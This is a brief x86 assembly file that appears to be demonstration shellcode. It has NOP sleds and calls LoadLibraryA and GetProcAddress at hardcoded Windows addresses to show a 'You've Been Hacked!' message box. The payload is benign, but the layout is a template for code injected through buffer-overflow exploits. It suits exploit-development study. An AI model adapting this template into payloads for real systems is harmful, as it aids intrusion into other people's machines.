
SECTION .data
user32dll db "User32.dll",0x00
msgBoxA db "MessageBoxA",0x00
MB_CAPTION db "Hacked!",0x00
MB_TEXT db "You've Been Hacked!",0x00

SECTION .text
global _main
_main:
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	sub esp, 0x110
	push dword 0x0012FF26; User32.dll ; Stacked
	mov eax, 0x7c801d7b; LoadLibraryA
	call eax
	push dword 0x0012FF32; MessageBoxA ; Stacked
	push dword eax; LoadLibraryA return value
	mov eax, 0x7c80ae2F; GetProcAddress
	call eax
	push dword 0; MB_OK
	push dword 0x0012FF3F; Caption ; Stacked
	push dword 0x0012FF48; Text ; Stacked
	push dword 0
	call eax
	add esp, 0x110
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	mov eax, 0
	ret
